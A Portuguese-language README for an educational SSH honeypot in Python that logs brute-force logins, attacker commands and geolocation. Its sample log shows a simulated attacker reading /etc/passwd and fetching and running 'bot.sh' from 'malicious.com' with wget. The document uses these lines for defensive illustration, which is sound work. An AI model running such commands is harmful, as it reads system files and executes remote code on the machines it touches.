# SSH Honeypot - Sistema de Detecção de Ataques

## Descrição
Honeypot SSH que simula um servidor SSH vulnerável para coletar informações sobre atacantes, técnicas de ataque e credenciais utilizadas. Registra todas as tentativas de acesso, comandos executados e comportamento dos atacantes.

## Objetivos de Aprendizado
- Conceitos de honeypots e threat intelligence
- Análise de comportamento de atacantes
- Coleta de IOCs (Indicators of Compromise)
- Técnicas de defesa proativa

## Tecnologias
- Python 3.8+
- Paramiko (SSH)
- SQLite (armazenamento)
- GeoIP2 (geolocalização)

## Funcionalidades
-  Simula servidor SSH em porta customizável
-  Registra tentativas de login (brute force)
-  Captura comandos executados pelos atacantes
-  Geolocalização de IPs atacantes
-  Emula sistema de arquivos falso
-  Coleta de IOCs (IPs, usuários, senhas, malware)
-  Dashboard de estatísticas
-  Exportação de dados para threat intelligence

## Instalação

```bash
git clone https://github.com/seu-usuario/ssh-honeypot.git
cd ssh-honeypot

python -m venv venv
source venv/bin/activate  # Linux/Mac
# ou
venv\Scripts\activate     # Windows

pip install -r requirements.txt

# Gerar chave SSH para o honeypot
ssh-keygen -t rsa -f honeypot_key -N ""
```

##  Uso

```bash
# Executar honeypot na porta 2222
python ssh_honeypot.py --port 2222

# Especificar host e porta
python ssh_honeypot.py --host 0.0.0.0 --port 2222

# Usar chave SSH customizada
python ssh_honeypot.py --key minha_chave
```

##  Estrutura do Projeto
```
ssh-honeypot/
├── ssh_honeypot.py      # Servidor honeypot
├── honeypot.db          # Banco de dados
├── logs/
│   └── honeypot.log     # Logs de eventos
└── requirements.txt
```

##  Dados Coletados

### Tentativas de Login
- IP de origem
- Porta de origem
- Usuário tentado
- Senha tentada
- Timestamp
- Geolocalização (país, cidade)
- Sucesso/Falha

### Sessões
- IP do atacante
- Duração da sessão
- Comandos executados
- Arquivos baixados/enviados
- Tentativas de escalação de privilégio

### Estatísticas
- Top 10 IPs atacantes
- Top 10 usuários mais tentados
- Top 10 senhas mais usadas
- Distribuição geográfica
- Horários de maior atividade
- Comandos mais executados

##  Exemplo de Output

```bash
[*] SSH Honeypot iniciado em 0.0.0.0:2222
[*] Aguardando conexões...

[2025-01-30 14:23:45] Nova conexão de 45.142.212.61:54321
[2025-01-30 14:23:46] Tentativa de login:
  - Usuário: root
  - Senha: admin123
  - Resultado: SUCESSO (fake)

[2025-01-30 14:23:48] Sessão iniciada - Comandos:
  > whoami
  > uname -a
  > cat /etc/passwd
  > wget http://malicious.com/bot.sh
  > chmod +x bot.sh
  > ./bot.sh

[2025-01-30 14:24:15] Sessão encerrada
  - Duração: 27 segundos
  - Comandos executados: 6
  -  COMANDO SUSPEITO: wget http://malicious.com/bot.sh
```

##  Dashboard de Estatísticas

Para visualizar estatísticas dos ataques capturados:

```bash
# Conectar ao banco de dados
sqlite3 honeypot.db

# Ver tentativas de login
SELECT username, password, COUNT(*) as tentativas 
FROM login_attempts 
GROUP BY username, password 
ORDER BY tentativas DESC 
LIMIT 10;

# Ver comandos mais executados
SELECT command, COUNT(*) as vezes 
FROM commands 
GROUP BY command 
ORDER BY vezes DESC 
LIMIT 10;

# Ver IPs mais ativos
SELECT source_ip, COUNT(*) as conexoes 
FROM login_attempts 
GROUP BY source_ip 
ORDER BY conexoes DESC 
LIMIT 10;
```

##  Aprendizados
Este projeto demonstra:
- Como honeypots funcionam na prática
- Padrões de comportamento de atacantes
- Técnicas de ataque SSH mais comuns
- Coleta e análise de threat intelligence
- Importância de senhas fortes

##  Considerações de Segurança

**IMPORTANTE:**
- Execute APENAS em ambiente controlado (VM ou rede isolada)
- Não exponha à internet sem proteção adequada
- Monitore recursos do sistema regularmente
- Faça backups regulares do banco de dados
- Revise logs frequentemente para identificar padrões

##  Troubleshooting

### Erro: "Chave SSH não encontrada"
**Solução:** Gere a chave SSH:
```bash
ssh-keygen -t rsa -f honeypot_key -N ""
```

### Erro: "Permission denied" na porta 22
**Solução:** Use porta > 1024 (ex: 2222) ou execute com sudo:
```bash
sudo python ssh_honeypot.py --port 22
```

### Erro: "No such file or directory: logs/honeypot.log"
**Solução:** O código agora cria a pasta automaticamente, mas se persistir:
```bash
mkdir logs
```

##  Recursos
- [The Honeynet Project](https://www.honeynet.org/)
- [SANS - Honeypots](https://www.sans.org/white-papers/)
- [Paramiko Documentation](https://www.paramiko.org/)

##  Licença
MIT License - Apenas para fins educacionais

##  Autor
Seu Nome - [LinkedIn](seu-linkedin) - [GitHub](seu-github)

---

⚠️ **AVISO LEGAL:** Este honeypot é apenas para fins educacionais. Use apenas em ambientes controlados e com autorização apropriada.
